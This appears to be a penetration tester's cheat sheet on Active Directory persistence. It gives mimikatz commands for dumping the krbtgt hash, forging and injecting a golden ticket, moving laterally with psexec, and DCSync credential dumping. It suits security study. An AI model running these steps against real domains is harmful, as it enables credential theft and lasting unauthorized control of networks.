# Persistence

<details>

<summary>Golden Tickets</summary>

* When a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain.
* The secret key is actually the password hash of a domain user account called krbtgt.

<!---->

* Requires access to an account that is in Domain Admins group or compromised the DC

1. Inside DC,

```
mimikatz.exe
```

```
privilege::debug
```

```
lsadump::lsa /patch
```

* Copy out the `krbtgt` hash.

2. Delete any existing Kerberos tickets and generate a golden ticket.

```
kerberos::purge
```

```sh
kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
```

3. Open anew command prompt and attempt lateral movement again

```
misc::cmd
```

```
psexec.exe \\dc01 cmd.exe
```

</details>

<details>

<summary>Domain Controller Synchronization</summary>

* Requires Domain admin  account.

1. On `Mimikatz.exe`,&#x20;

```
lsadump::dcsync /user:Administrator
```

* The dump contains multiple hashes associated with the last twenty-nine used user passwords as well as the hashes used with AES encryption.

</details>

